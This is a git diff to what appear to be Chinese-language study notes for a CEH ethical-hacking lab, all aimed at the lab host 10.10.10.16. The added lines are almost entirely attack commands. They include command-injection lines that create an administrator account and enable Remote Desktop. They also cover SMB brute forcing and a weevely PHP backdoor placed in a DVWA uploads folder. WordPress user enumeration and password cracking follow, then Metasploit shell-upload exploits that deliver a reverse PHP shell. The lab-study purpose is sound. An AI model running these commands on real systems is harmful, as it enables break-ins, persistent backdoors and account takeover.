@@ -18,14 +18,32 @@ ifconfig
 route -n
 
 
-# 共享資料夾
-net use \\10.10.10.16 apple /u:martin
-net view \\10.10.10.16
+# 加使用者cehp、並給sudo
+sudo useradd cehp
+sudo passwd cehp #會提示你輸入密碼
+cut -d: -f1 /etc/passwd | grep cehp
+sudo usermod -aG sudo cehp # 或sudo usermod -aG wheel cehp
+getent group sudo # getent group wheel
 ```
 
 ## windows
 ```powershell
 ifconfig
+
+# 共享資料夾
+net use \\10.10.10.16 apple /u:martin
+net view \\10.10.10.16
+
+# 管道
+echo 123 | whoami
+| net user cehp /add
+| net users
+| net localgroup Administrators cehp /add
+| net localgroup Administrators
+| reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Terminal Server" /vfDenyTSConnections /t REG_DWORD /d 0 /f
+| netstat -an | findstr :3389
+
+net user cehp
 ```
 
 
@@ -67,7 +85,61 @@ enum4linux -u martin -p apple -a 10.10.10.16
 hydra -L win32-users.txt -P /usr/share/wordlists/nmap.lst smb://10.10.10.16
 
 
+# 列舉分享資料夾
 python3 -m pip install --upgrade impacket
 crackmapexec smb 10.10.10.16 -u martin -p apple --shares
 ```
+
+
+
+
+## 製作後門php
+```bash
+weevely generate cehp backdoor.php #cehp為後門密碼
+weevely http://10.10.10.16:8080/dvwa/hackable/uploads/backdoor.php cehp
+```
+
+
+## WPScan
+```bash
+whatweb http://10.10.10.16:8080/ceh
+wpscan --url http://10.10.10.16:8080/ceh -e u # -e u表示列舉使用者
+wpscan --url http://10.10.10.16:8080/ceh -P /usr/share/wordlists/nmap.lst # -e u表示列舉使用者
+wpscan --url http://10.10.10.16:8080/ceh --api-token
+```
+
+
+
+## Metasploit
+```bash
+sudo service postgresql start
+msfconsole
+
+use exploit/unix/webapp/wp_admin_shell_upload
+show info
+set RHOSTS 10.10.10.16
+set RPORT 8080
+set TARGETURI /ceh
+set USERNAME admin
+set PASSWORD qwerty@123
+set PAYLOAD php/reverse_php
+exploit
+```
+
+```bash
+msfconsole
+use exploit/unix/webapp/wp_photo_gallery_unrestricted_file_upload
+show info
+set RHOSTS 10.10.10.16
+set RPORT 8080
+set TARGETURI /ceh
+set USERNAME cehuser1
+set PASSWORD green
+set PAYLOAD php/reverse_php
+exploit
+```
+
+
+### 外掛
+[https://downloads.wordpress.org/plugin/photo-gallery.1.2.5.zip](https://downloads.wordpress.org/plugin/photo-gallery.1.2.5.zip)
 
